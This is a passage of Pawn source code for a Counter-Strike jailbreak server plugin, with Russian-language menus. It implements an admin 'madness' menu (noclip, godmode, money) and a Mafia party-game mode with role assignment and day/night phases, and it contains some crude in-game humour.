public effect_Pukan_free(pPlayer)    // Пердёшь
{
    emit_sound(0, CHAN_AUTO, "jb_engine/pook.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
    
    new original[ 3 ];
    get_user_origin(pPlayer, original);
    
    message_begin(MSG_BROADCAST, SVC_TEMPENTITY);     // спрайт зеленый огонь
    write_byte(TE_SPRITE);
    write_coord(original[0]);
    write_coord(original[1]);
    write_coord(original[2]);
    write_short(effect_fd);
    write_byte(20);
    write_byte(255);
    message_end();
    
    message_begin(MSG_ONE, get_user_msgid("ScreenFade"), {0,0,0}, pPlayer);    // затемнение экрана
    write_short(1<<12);
    write_short(1<<10);
    write_short(0x0000);
    write_byte(45);        //r
    write_byte(255);    //g
    write_byte(70);        //b
    write_byte(75);
    message_end();
}

Show_MadnessMenu(id)
{
    new szMenu[512], iKeys = (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), iLen;
    iLen = formatex(szMenu, charsmax(szMenu), "\wМеню маднесса [1/1]^n^n");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \wНоклип: %s^n", g_iNoClip[id] ? "\rВыкл" : "\yВкл");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \wБессмертие: %s^n", g_iGodGame[id] ? "\rВыкл" : "\yВкл");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \wВзять \y$1000^n");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \wВзять освобождение^n");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \wУбрать розыск^n");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \wОтобрать все у ТТ^n");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[7] \wОтобрать все у КТ^n");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[8] \wШляпы: %s^n", g_BlockCostumes ? "\rВыкл" : "\yВкл");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_MadnessMenu");
}

public Handle_MadnessMenu(id, iKey)
{
    if(g_iDayMode != 1 && g_iDayMode != 2) return PLUGIN_HANDLED;

	new szName[32];
	get_user_name(id, szName, charsmax(szName));
	
	switch(iKey)
	{
	    case 0: 
		{	
			if(g_iNoClip[id])
			{			
				g_iNoClip[id] = 0;
				set_user_noclip(id, 0);
				set_user_maxspeed(id, 250.0);
				UTIL_SayText(0, "%L !tМаднесс !g%s !tвыключил !gноклип", LANG_PLAYER, "JBE_PREFIX", szName);
			}
			else 
			{
				g_iNoClip[id] = 1;
				set_user_noclip(id, 1);
				set_user_maxspeed(id, 400.0);
				UTIL_SayText(0, "%L !tМаднесс !g%s !tвключил !gноклип", LANG_PLAYER, "JBE_PREFIX", szName);
			}
		}
		case 1: 
		{	
			if(g_iGodGame[id])
			{			
				g_iGodGame[id] = 0;
				set_user_godmode(id, 0);
				UTIL_SayText(0, "%L !tМаднесс !g%s !tвыключил !gбессмертие", LANG_PLAYER, "JBE_PREFIX", szName);
			}
			else 
			{
				g_iGodGame[id] = 1;
				set_user_godmode(id, 1);
				UTIL_SayText(0, "%L !tМаднесс !g%s !tвключил !gбессмертие", LANG_PLAYER, "JBE_PREFIX", szName);
			}
		}
		case 2:
		{
			jbe_set_user_money(id, g_iUserMoney[id] + 1000, 1);
			UTIL_SayText(id, "%L !tвы взяли !g+$1000.", LANG_PLAYER, "JBE_PREFIX");
		}
		case 3:
		{
			jbe_add_user_free(id);
			UTIL_SayText(id, "%L !tвы взяли !gосвобождение.", LANG_PLAYER, "JBE_PREFIX");
		}
		case 4:
		{
			jbe_sub_user_wanted(id);
			UTIL_SayText(id, "%L !tвы взяли !gснятие розыска.", LANG_PLAYER, "JBE_PREFIX");
		}
		case 5: 
		{	
			for(new i = 1; i<=g_iMaxPlayers; i++) 
			{
				if(g_iUserTeam[i] == 1)
				{
					set_pev(i, pev_gravity, 1.0);
					ClearBit(g_iBitFastRun, i);
			        ExecuteHamB(Ham_Player_ResetMaxSpeed, i);
					ClearBit(g_iBitAutoBhop, i);
			        ClearBit(g_iBitFastRun, i);
			        ClearBit(g_iBitDoubleJump, i);
			        ClearBit(g_iBitRandomGlow, i);
			        ClearBit(g_iBitInvisibleHat, i);
			        ClearBit(g_iBitHingJump, i);
					ClearBit(g_iBitDoubleDamage, i);
					ClearBit(g_iBitRandomGlow, i);
					ClearBit(g_iBitBalisong, i);
			        ClearBit(g_iBitScrewdriver, i);
					ClearBit(g_iBitSharpening, i);
					ClearBit(g_iBitMachete, i);
					ClearBit(g_iBitSerp, i);
				}
			}
			UTIL_SayText(0, "%L !tМаднесс !g%s !tЗабрал всё !gу зеков", LANG_PLAYER, "JBE_PREFIX", szName);
		}
		case 6: 
		{	
			for(new i = 1; i<=g_iMaxPlayers; i++) 
			{
				if(g_iUserTeam[i] == 2)
				{
					set_pev(i, pev_gravity, 1.0);
					ClearBit(g_iBitFastRun, i);
			        ExecuteHamB(Ham_Player_ResetMaxSpeed, i);
					ClearBit(g_iBitAutoBhop, i);
			        ClearBit(g_iBitFastRun, i);
			        ClearBit(g_iBitDoubleJump, i);
			        ClearBit(g_iBitRandomGlow, i);
			        ClearBit(g_iBitInvisibleHat, i);
			        ClearBit(g_iBitHingJump, i);
					ClearBit(g_iBitDoubleDamage, i);
					ClearBit(g_iBitRandomGlow, i);
					ClearBit(g_iBitBalisong, i);
			        ClearBit(g_iBitScrewdriver, i);
					ClearBit(g_iBitSharpening, i);
					ClearBit(g_iBitShocker, i);
					ClearBit(g_iBitMachete, i);
					ClearBit(g_iBitSerp, i);
				}
			}
			UTIL_SayText(0, "%L !tМаднесс !g%s !tЗабрал всё !gу охраны", LANG_PLAYER, "JBE_PREFIX", szName);
		}
		case 7:
		{
			if(g_BlockCostumes) g_BlockCostumes = false;
			else g_BlockCostumes = true;
			UTIL_SayText(0, "%L !tМаднесс !g%s !t%s !gшляпы, !tвсем игрокам", LANG_PLAYER, "JBE_PREFIX", szName, g_BlockCostumes ? "выключил" : "включил");
		}
		case 8: return Show_PrivilegesMenu(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_MadnessMenu(id);
}

Show_MafiaMenu(id)
{
    if(g_iDayMode != 1 && g_iDayMode != 2 || IsNotSetBit(g_iBitUserAlive, id) || id != g_iChiefId) return PLUGIN_HANDLED;

    new szMenu[512], iKeys = (1<<0|1<<9), iLen = formatex(szMenu, charsmax(szMenu), "\wМеню игры мафия:^n^n");
    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%s^n^n", g_MafiaGame ? "Закончить игру" : "Начать игру");
    if(g_MafiaGame)
    {
        iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \wНазначение ролей^n");
        iKeys |= (1<<1);
    }
    else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \dНазначение ролей \r[не доступно]^n");
    if(g_MafiaGame)
    {
        iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \wСнять с роли^n");
        iKeys |= (1<<2);
    }
    else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \dСнять с роли \r[не доступно]^n");
    if(g_MafiaGame)
    {
        iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \wРежим времени \r[доступен]^n");
        iKeys |= (1<<3);
    }
    else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \dРежим времени \r[не доступен]^n");
    
    if(g_MafiaGame)
    {
        iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \wЗаписать результат дня^n^n");
        iKeys |= (1<<4);
    }
    else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \dЗаписать результат дня^n^n");
    
    if(g_MafiaGame)
    {
        iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \wРезультат дня^n^n");
        iKeys |= (1<<5);
    }
    else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \dРезультат дня^n^n");

    formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[0] \w%L", id, "JBE_MENU_EXIT");
    return show_menu(id, iKeys, szMenu, -1, "Show_MafiaMenu");
}

public Handle_MafiaMenu(id, iKey)
{
    switch(iKey)
    {
    	case 0:
        {
                if(g_MafiaGame == 0)
            	{
                	for(new iPlayer = 1; iPlayer <= g_iMaxPlayers; iPlayer++)
                	{
                   	    if(g_iAlivePlayersNum[g_iUserTeam[iPlayer] == 1])
                    	{
                        	set_pev(iPlayer, pev_flags, pev(iPlayer, pev_flags) | FL_FROZEN);
                    	}
               		}
                	g_MafiaGame = 1;
                	hud_on();
                	set_dhudmessage(255, 165, 0, -1.0, 0.40, 0, 6.0, 4.0);
                	show_dhudmessage(0, "Игра мафия начинается...");
                	Show_MafiaMenu(id);
            	}else{
                	for(new iPlayer = 1; iPlayer <= g_iMaxPlayers; iPlayer++)
                	{
                    	if(g_iAlivePlayersNum[g_iUserTeam[iPlayer] == 1])
                    	{
                       	    set_pev(iPlayer, pev_flags, pev(iPlayer, pev_flags) & ~FL_FROZEN);
                    	}
                    }
                	g_MafiaGame = 0;
                	remove_task(8888);
                	mafia_off();
                	set_dhudmessage(255, 165, 0, -1.0, 0.40, 0, 6.0, 4.0);
                	show_dhudmessage(0, "Игра мафия закончена....");
                	Show_MafiaMenu(id);
            	}
        }
    	case 1:
        {
            if(g_MafiaGame == 1) return Show_MafiaRoley(id);
            else return Show_MafiaMenu(id);
        }
    	case 2:
        {
            if(g_MafiaGame == 1) return Cmd_RoleyName(id);
            else return Show_MafiaMenu(id);
        }
    	case 3:
        {
            if(g_MafiaGame == 1) return Show_MafiaTimer(id);
            else return Show_MafiaMenu(id);
        }
    	case 4: 
        {
            if(g_MafiaGame == 1) return Cmd_VoteDay(id);
            else return Show_MafiaMenu(id);
        }
    	case 5: 
        {
            if(g_MafiaGame == 1) return Show_ResultVote(id, g_iMenuPosition[id]);
            else return Show_MafiaMenu(id);
        }
    }
    return PLUGIN_HANDLED;
}

Show_ResultVote(id, iPos)
{
    new iPlayersNum;
    for(new i = 1; i <= g_iMaxPlayers; i++)
    {
        if(IsNotSetBit(g_iBitUserAlive, i) || g_iUserTeam[i] != 1 || g_PlayerVote[i] != 1) continue;
        g_iMenuPlayers[id][iPlayersNum++] = i;
    }
    new iStart = iPos * PLAYERS_PER_PAGE;
    if(iStart > iPlayersNum) iStart = iPlayersNum;
    iStart = iStart - (iStart % 8);
    g_iMenuPosition[id] = iStart / PLAYERS_PER_PAGE;
    new iEnd = iStart + PLAYERS_PER_PAGE;
    if(iEnd > iPlayersNum) iEnd = iPlayersNum;
    new szMenu[512], iLen, iPagesNum = (iPlayersNum / PLAYERS_PER_PAGE + ((iPlayersNum % PLAYERS_PER_PAGE) ? 1 : 0));
    switch(iPagesNum)
    {
    case 0:
        {
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_PLAYERS_NOT_VALID");
            return Show_MafiaMenu(id);
        }
    default: iLen = formatex(szMenu, charsmax(szMenu), "\yРезультат дня \w[%d|%d]^n^n", iPos + 1, iPagesNum);
    }
    new szName[32], i, iKeys = (1<<9), b;
    for(new a = iStart; a < iEnd; a++)
    {
        i = g_iMenuPlayers[id][a];
        get_user_name(i, szName, charsmax(szName));
        new szNameResult[128];
        if(g_KomVote[i]) format(szNameResult, charsmax(szNameResult), "был проверен");
        else if(g_MafiaVote[i]) format(szNameResult, charsmax(szNameResult), "убит мафией");
        else if(g_DoctorVote[i]) format(szNameResult, charsmax(szNameResult), "был у доктора");
        else if(g_ManyakVote[i]) format(szNameResult, charsmax(szNameResult), "убит маньяком");
        else if(g_ShluxaVote[i]) format(szNameResult, charsmax(szNameResult), "трахнут");
        new szNameRoley[128];
        if(g_Mafia[i]) format(szNameRoley, charsmax(szNameRoley), "Мафия");
        else if(g_Komissar[i]) format(szNameRoley, charsmax(szNameRoley), "Комиссар");
        else if(g_Doctor[i]) format(szNameRoley, charsmax(szNameRoley), "Доктор");
        else if(g_Manyak[i]) format(szNameRoley, charsmax(szNameRoley), "Маньяк");
        else if(g_Shluxa[i]) format(szNameRoley, charsmax(szNameRoley), "Шлюха");
        else if(g_Mir[i]) format(szNameRoley, charsmax(szNameRoley), "Житель");
        iKeys |= (1<<b);
        iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w[%s] \w%s \r[%s]^n", ++b, szNameRoley, szName, szNameResult);
    }
    for(new i = b; i < PLAYERS_PER_PAGE; i++) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n");
    if(iEnd < iPlayersNum)
    {
        iKeys |= (1<<8);
        formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L^n\r[0] \w%L", id, "JBE_MENU_NEXT", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
    }
    else formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n^n\r[0] \w%L", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
    return show_menu(id, iKeys, szMenu, -1, "Show_ResultVote");
}

public Handle_ResultVote(id, iKey)
{
    switch(iKey)
    {
    case 8: return Show_ResultVote(id, ++g_iMenuPosition[id]);
    case 9: return Show_ResultVote(id, --g_iMenuPosition[id]);
    default:
        {
            Show_ResultVote(id, g_iMenuPosition[id]);
        }
    }
    return PLUGIN_HANDLED;
}

Cmd_VoteDay(id) return Show_VoteDay(id, g_iMenuPosition[id] = 0);
Show_VoteDay(id, iPos)
{
    new iPlayersNum;
    for(new i = 1; i <= g_iMaxPlayers; i++)
    {
        if(IsNotSetBit(g_iBitUserAlive, i) || g_iUserTeam[i] != 1) continue;
        g_iMenuPlayers[id][iPlayersNum++] = i;
    }
    new iStart = iPos * PLAYERS_PER_PAGE;
    if(iStart > iPlayersNum) iStart = iPlayersNum;
    iStart = iStart - (iStart % 8);
    g_iMenuPosition[id] = iStart / PLAYERS_PER_PAGE;
    new iEnd = iStart + PLAYERS_PER_PAGE;
    if(iEnd > iPlayersNum) iEnd = iPlayersNum;
    new szMenu[512], iLen, iPagesNum = (iPlayersNum / PLAYERS_PER_PAGE + ((iPlayersNum % PLAYERS_PER_PAGE) ? 1 : 0));
    switch(iPagesNum)
    {
    case 0:
        {
            UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_PLAYERS_NOT_VALID");
            return Show_MafiaRoley(id);
        }
    default: iLen = formatex(szMenu, charsmax(szMenu), "\yВыберите жителя \w[%d|%d]^n^n", iPos + 1, iPagesNum);
    }
    new szName[32], i, iKeys = (1<<9), b;
    for(new a = iStart; a < iEnd; a++)
    {
        i = g_iMenuPlayers[id][a];
        get_user_name(i, szName, charsmax(szName));
        iKeys |= (1<<b);
        iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w%s^n", ++b, szName);
    }
    for(new i = b; i < PLAYERS_PER_PAGE; i++) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n");
    if(iEnd < iPlayersNum)
    {
        iKeys |= (1<<8);
        formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L^n\r[0] \w%L", id, "JBE_MENU_NEXT", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
    }
    else formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n^n\r[0] \w%L", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
    return show_menu(id, iKeys, szMenu, -1, "Show_VoteDay");
}

public Handle_VoteDay(id, iKey)
{
    switch(iKey)
    {
    case 8: return Show_VoteDay(id, ++g_iMenuPosition[id]);
    case 9: return Show_VoteDay(id, --g_iMenuPosition[id]);
    default:
        {
            new iTarget = g_iMenuPlayers[id][g_iMenuPosition[id] * PLAYERS_PER_PAGE + iKey];
            if(g_DayMafia == 0) 
            {
                g_MafiaVote[iTarget] = 1;
                g_PlayerVote[iTarget] = 1;
            }
            else if(g_KomDay == 0)
            {
                g_KomVote[iTarget] = 1;
                g_PlayerVote[iTarget] = 1;
            }
            else if(g_DocDay == 0)
            {
                g_DoctorVote[iTarget] = 1;
                g_PlayerVote[iTarget] = 1;
            }
            else if(g_ManDay == 0) 
            {
                g_ManyakVote[iTarget] = 1;
                g_PlayerVote[iTarget] = 1;
            }
            else if(g_ShlDay == 0)
            {
                g_ShluxaVote[iTarget] = 1;
                g_PlayerVote[iTarget] = 1;
            }
            Show_MafiaTimer(id);
        }
    }
    return PLUGIN_HANDLED;
}

Show_MafiaTimer(id)
{
    new szMenu[512], iKeys = (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<8|1<<9), iLen = formatex(szMenu, charsmax(szMenu), "\yРежим времени:^n^n");
    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \wГлобальная ночь: \r%s^n", g_MafiaDay ? "Вкл" : "Выкл");
    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \wМафия: \r%s^n", g_DayMafia ? "Ночь" : "День");
    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \wКомиссар: \r%s^n", g_KomDay ? "Ночь" : "День");
    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \wДоктор: \r%s^n", g_DocDay ? "Ночь" : "День");
    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \wМаньяк: \r%s^n", g_ManDay ? "Ночь" : "День");
    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \wШлюха: \r%s^n^n^n", g_ShlDay ? "Ночь" : "День");
    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[9] \w%L^n", id, "JBE_MENU_BACK");
    formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[0] \w%L", id, "JBE_MENU_EXIT");
    return show_menu(id, iKeys, szMenu, -1, "Show_MafiaTimer");  
}

public Handle_MafiaTimer(id, iKey)
{
    switch(iKey)
    {
    case 0:
        {
            if(!g_MafiaDay) 
            {
                g_MafiaDay = 1;
                g_DayMafia = 1;
                g_KomDay = 1;
                g_DocDay = 1;
                g_ManDay = 1;
                g_ShlDay = 1;
                for(new i = 1; i<=g_iMaxPlayers; i++)
                {
                    g_MafiaVote[i] = 0;
                    g_KomVote[i] = 0;
                    g_DoctorVote[i] = 0;
                    g_ManyakVote[i] = 0;
                    g_ShluxaVote[i] = 0;
                    g_PlayerVote[i] = 0;
                    if(g_iAlivePlayersNum[g_iUserTeam[i] == 1])
                    {
                        BlackFade(i, 1);
                    }
                }
                set_hudmessage(255, 165, 255, -1.0, 0.60, 0, 6.0, 3.0);
                show_hudmessage(0, "Наступила ночь, все засыпают.");
                Show_MafiaTimer(id) ;
            }
            else
            {
                g_MafiaDay = 0;
                g_DayMafia = 0;
                g_KomDay = 0;
                g_DocDay = 0;
                g_ManDay = 0;
                g_ShlDay = 0;
                for(new i = 1; i<=g_iMaxPlayers; i++)
                {
                    if(g_iAlivePlayersNum[g_iUserTeam[i] == 1])
                    {
                        BlackFade(i, 0);                             
                    }
                }
                set_hudmessage(255, 165, 255, -1.0, 0.60, 0, 6.0, 3.0);
                show_hudmessage(0, "Наступил день, все просыпаются.");
                Show_ResultVote(id, g_iMenuPosition[id]);
            }
        }
    case 1:
        {
            if(!g_DayMafia) 
            {
                for(new i = 1; i<=g_iMaxPlayers; i++)
                {
                    if(g_iAlivePlayersNum[g_iUserTeam[i] == 1] && g_Mafia[i] == 1)
                    {
                        BlackFade(i, 1);
                        g_DayMafia = 1;    
                        set_pev(i, pev_flags, pev(i, pev_flags) | FL_FROZEN);
                    }
                }
                set_hudmessage(255, 165, 255, -1.0, 0.60, 0, 6.0, 5.0);
                show_hudmessage(0, "Мафия засыпает...");
                Show_MafiaTimer(id);
            }
            else
            {
                for(new i = 1; i<=g_iMaxPlayers; i++)
                {
                    if(g_iAlivePlayersNum[g_iUserTeam[i] == 1] && g_Mafia[i] == 1)
                    {
                        BlackFade(i, 0);
                        g_DayMafia = 0;
                        set_pev(i, pev_flags, pev(i, pev_flags) & ~FL_FROZEN);
                    }
                }
                Cmd_VoteDay(id);
                set_hudmessage(255, 165, 255, -1.0, 0.60, 0, 6.0, 5.0);
                show_hudmessage(0, "Мафия просыпается...");
            }
        }
    case 2:
        {
            if(!g_KomDay) 
            {
                for(new i = 1; i<=g_iMaxPlayers; i++)
                {                        
                    if(g_iAlivePlayersNum[g_iUserTeam[i] == 1] && g_Komissar[i] == 1)
                    {
                        BlackFade(i, 1);
                        g_KomDay = 1;
                        set_pev(i, pev_flags, pev(i, pev_flags) | FL_FROZEN);
                    }
                }
                set_hudmessage(255, 165, 255, -1.0, 0.60, 0, 6.0, 5.0);
                show_hudmessage(0, "Комиссар засыпает...");
                Show_MafiaTimer(id); 
            }
            else
            {
                for(new i = 1; i<=g_iMaxPlayers; i++)
                {
                    if(g_iAlivePlayersNum[g_iUserTeam[i] == 1] && g_Komissar[i] == 1)
                    {
                        BlackFade(i, 0);
                        g_KomDay = 0;
                        set_pev(i, pev_flags, pev(i, pev_flags) & ~FL_FROZEN);
                    }
                }
                set_hudmessage(255, 165, 255, -1.0, 0.60, 0, 6.0, 5.0);
                show_hudmessage(0, "Комиссар просыпается...");
                Cmd_VoteDay(id);
            }
        }
    case 3:
        {
            if(!g_DocDay) 
            {
                for(new i = 1; i<=g_iMaxPlayers; i++)
                {
                    if(g_iAlivePlayersNum[g_iUserTeam[i] == 1] && g_Doctor[i] == 1)
                    {
                        BlackFade(i, 1);
                        g_DocDay = 1;    
                        set_pev(i, pev_flags, pev(i, pev_flags) | FL_FROZEN);
                    }
                }
                set_hudmessage(255, 165, 255, -1.0, 0.60, 0, 6.0, 5.0);
                show_hudmessage(0, "Доктор засыпает...");
                Show_MafiaTimer(id); 
            }
            else
            {
                for(new i = 1; i<=g_iMaxPlayers; i++)
                {
                    g_DoctorVote[i] = 0;
                    if(g_iAlivePlayersNum[g_iUserTeam[i] == 1] && g_Doctor[i] == 1)
                    {
                        BlackFade(i, 0);
                        g_DocDay = 0;
                        set_pev(i, pev_flags, pev(i, pev_flags) & ~FL_FROZEN);
                    }
                }
                set_hudmessage(255, 165, 255, -1.0, 0.60, 0, 6.0, 5.0);
                show_hudmessage(0, "Доктор просыпается.");
                Cmd_VoteDay(id); 
            }
        }
    case 4:
        {
            if(!g_ManDay) 
            {
                for(new i = 1; i<=g_iMaxPlayers; i++)
                {
                    if(g_iAlivePlayersNum[g_iUserTeam[i] == 1] && g_Manyak[i] == 1)
                    {
                        BlackFade(i, 1);
                        g_ManDay = 1;
                        set_pev(i, pev_flags, pev(i, pev_flags) | FL_FROZEN);            
                    }
                }
                set_hudmessage(255, 165, 255, -1.0, 0.60, 0, 6.0, 5.0);
                show_hudmessage(0, "Маньяк засыпает...");
                Show_MafiaTimer(id); 
            }
            else
            {
                for(new i = 1; i<=g_iMaxPlayers; i++)
                {
                    g_ManyakVote[i] = 0;
                    if(g_iAlivePlayersNum[g_iUserTeam[i] == 1] && g_Manyak[i] == 1)
                    {
                        BlackFade(i, 0);
                        g_ManDay = 0;
                        set_pev(i, pev_flags, pev(i, pev_flags) & ~FL_FROZEN);
                    }
                }
                set_hudmessage(255, 165, 255, -1.0, 0.60, 0, 6.0, 5.0);
                show_hudmessage(0, "Маньяк просыпается...");
                Cmd_VoteDay(id); 
            }
        }
    case 5:
        {
            if(!g_ShlDay) 
            {
                for(new i = 1; i<=g_iMaxPlayers; i++)
                {
                    if(g_iAlivePlayersNum[g_iUserTeam[i] == 1] && g_Shluxa[i] == 1)
                    {
                        BlackFade(i, 1);
                        g_ShlDay = 1;    
                        set_pev(i, pev_flags, pev(i, pev_flags) | FL_FROZEN);
                    }
                }
                set_hudmessage(255, 165, 255, -1.0, 0.60, 0, 6.0, 5.0);
                show_hudmessage(0, "Проститутка засыпает...");
                Show_MafiaTimer(id); 
            }
            else
            {
                for(new i = 1; i<=g_iMaxPlayers; i++)
                {
                    g_ShluxaVote[i] = 0;
                    if(g_iAlivePlayersNum[g_iUserTeam[i] == 1] && g_Shluxa[i] == 1)
                    {
                        BlackFade(i, 0);
                        g_ShlDay = 0;
                        set_pev(i, pev_flags, pev(i, pev_flags) & ~FL_FROZEN);
                    }
                }
                set_hudmessage(255, 165, 255, -1.0, 0.60, 0, 6.0, 5.0);
                show_hudmessage(0, "Проститутка просыпается...");
                Cmd_VoteDay(id);
            }
        }
    case 8: Show_MafiaMenu(id);
    }
    return PLUGIN_HANDLED;
}

stock UTIL_GetCvarString(const s_String[]) {
	new sDataString[128];
	get_cvar_string(s_String, sDataString, charsmax(sDataString));
	
	return sDataString;
}

stock BlackFade(id, Type)
{
    if(Type == 0)
    {
        message_begin(MSG_ONE, get_user_msgid("ScreenFade"), _, id);
        write_short(1 << 12);
        write_short(1 << 9);
        write_short(1 << 0);
        write_byte(0);
        write_byte(0);
        write_byte(0);
        write_byte(0);
        message_end();
    }
    else if(Type == 1)
    {
        message_begin(MSG_ONE, get_user_msgid("ScreenFade"), _, id);
        write_short(1 << 0);
        write_short(1 << 0);
        write_short(1 << 2);
        write_byte(0);
        write_byte(0);
        write_byte(0);
        write_byte(255);
        message_end();
    }
}

Show_MafiaRoley(id)
{
    new szMenu[512], iKeys = (1<<0|1<<1|1<<2|1<<3|1<<4|1<<8|1<<9), iLen = formatex(szMenu, charsmax(szMenu), "\yМеню назначения ролей:^n^n");
    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \wНазначить \rмафию^n");
    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \wНазначить \rкомиссара^n");
    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \wНазначить \rдоктора^n");
    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \wНазначить \rманьяка^n");
    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \wНазначить \rшлюху^n^n^n");
    iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[9] \w%L^n", id, "JBE_MENU_BACK");
    formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[0] \w%L", id, "JBE_MENU_EXIT");
    return show_menu(id, iKeys, szMenu, -1, "Show_MafiaRoley");
}

public Handle_MafiaRoley(id, iKey)
{
    switch(iKey)
    {
    case 0:
        {
            Cmd_PlayerMafia(id);
        }
    case 1:
        {
            Cmd_PlayerKomissar(id);
        }
    case 2:
        {
            Cmd_PlayerDoctor(id);
        }
    case 3:
        {
            Cmd_PlayerManyak(id);
        }
    case 4:
        {
            Cmd_PlayerShluxa(id);
        }
    case 8:
        {
            Show_MafiaMenu(id);
        }
    }
    return PLUGIN_HANDLED;
}

Cmd_PlayerMafia(id) return Show_PlayerMafia(id, g_iMenuPosition[id] = 0);
Show_PlayerMafia(id, iPos)
{
    new iPlayersNum;
    for(new i = 1; i <= g_iMaxPlayers; i++)
    {
        if(IsNotSetBit(g_iBitUserAlive, i) || g_iUserTeam[i] != 1 || g_Mir[i] != 1) continue;
        g_iMenuPlayers[id][iPlayersNum++] = i;
    }
    new iStart = iPos * PLAYERS_PER_PAGE;
    if(iStart > iPlayersNum) iStart = iPlayersNum;
    iStart = iStart - (iStart % 8);
    g_iMenuPosition[id] = iStart / PLAYERS_PER_PAGE;
    new iEnd = iStart + PLAYERS_PER_PAGE;
    if(iEnd > iPlayersNum) iEnd = iPlayersNum;
    new szMenu[512], iLen, iPagesNum = (iPlayersNum / PLAYERS_PER_PAGE + ((iPlayersNum % PLAYERS_PER_PAGE) ? 1 : 0));
    switch(iPagesNum)
    {
    case 0:
        {
            UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_PLAYERS_NOT_VALID");
            return Show_MafiaRoley(id);
        }
    default: iLen = formatex(szMenu, charsmax(szMenu), "\yВыберите, кого назначить \w[%d|%d]^n^n", iPos + 1, iPagesNum);
    }
    new szName[32], i, iKeys = (1<<9), b;
    for(new a = iStart; a < iEnd; a++)
    {
        i = g_iMenuPlayers[id][a];
        get_user_name(i, szName, charsmax(szName));
        iKeys |= (1<<b);
        iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[%d] \w%s^n", ++b, szName);
    }
    for(new i = b; i < PLAYERS_PER_PAGE; i++) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n");
    if(iEnd < iPlayersNum)
    {
        iKeys |= (1<<8);
        formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L^n\r[0] \w%L", id, "JBE_MENU_NEXT", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
    }
    else formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n^n\r[0] \w%L", id, iPos ? "JBE_MENU_BACK" : "JBE_MENU_EXIT");
    return show_menu(id, iKeys, szMenu, -1, "Show_PlayerMafia");
}

public Handle_PlayerMafia(id, iKey)
{
    switch(iKey)
    {
    case 8: return Show_PlayerMafia(id, ++g_iMenuPosition[id]);
    case 9: return Show_PlayerMafia(id, --g_iMenuPosition[id]);
    default:
        {
